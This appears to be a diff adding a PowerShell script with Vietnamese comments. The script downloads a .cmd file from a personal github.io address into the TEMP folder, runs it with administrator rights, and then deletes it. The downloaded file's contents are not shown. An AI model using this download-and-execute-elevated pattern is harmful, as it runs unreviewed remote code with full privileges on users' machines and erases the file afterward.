@@ -1,0 +1,47 @@
+#Code compiled from multiple sources
+try {
+    # Su dung TLS 1.2 cho ket noi HTTPS
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+} catch {}
+
+# Dat URL tai file
+$url = 'https://drhoangzp.github.io/x.cmd'
+
+# Tao ten file ngau nhien trong thu muc TEMP
+$rand = [guid]::NewGuid().ToString()
+$tempPath = Join-Path $env:TEMP "x_$rand.cmd"
+
+# Tai file
+try {
+    Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction Stop
+#    Write-Host "Tai file thanh cong: $tempPath"
+} catch {
+    Write-Error "Khong the tai file tu $url"
+    return
+}
+
+# Kiem tra file da duoc tao chua
+if (-not (Test-Path $tempPath)) {
+    Write-Error "File khong ton tai sau khi tai ve. Dung lai."
+    return
+}
+
+# Thuc thi file voi quyen admin
+
+try {
+# Neu khong muon chuyen admin thi thay Start-Process -FilePath "cmd.exe" ... thi thay thanh & cmd.exe /c "`"$tempPath`""
+#    & cmd.exe /c "`"$tempPath`""
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempPath`"" -Verb RunAs -Wait
+} catch {
+    Write-Error "Khong the thuc thi file: $($_.Exception.Message)"
+    return
+}
+
+# Xoa file sau khi thuc thi xong
+try {
+    Remove-Item $tempPath -Force
+#    Write-Host "Da xoa file: $tempPath"
+} catch {
+    Write-Warning "Khong the xoa file: $($_.Exception.Message)"
+}
+
